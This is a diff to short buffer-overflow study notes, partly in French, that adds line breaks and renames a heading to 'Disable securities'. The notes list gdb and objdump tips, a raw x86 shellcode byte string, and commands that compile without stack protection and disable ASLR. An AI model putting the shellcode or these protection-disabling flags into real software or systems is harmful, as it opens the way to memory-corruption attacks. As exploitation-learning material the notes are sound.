@@ -1,5 +1,6 @@
 # Buffer overflow
 
+</br>
 ## Tools
 
 Plugin pour gdb : https://github.com/longld/peda
@@ -7,6 +8,7 @@ string xxx
 test eax, eax : caracteristique des comparaisons de strings
 objdump -D buffer_01
 
+</br>
 
 ## Payloads
 
@@ -15,7 +17,9 @@ objdump -D buffer_01
 "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
 ````
 
-## Security
+</br>
+
+## Disable securities
 
 gcc -fno-stack-protector -z execstack 
 Disable ASLR for one binary : setarch `uname -m` -R /root/mybinary
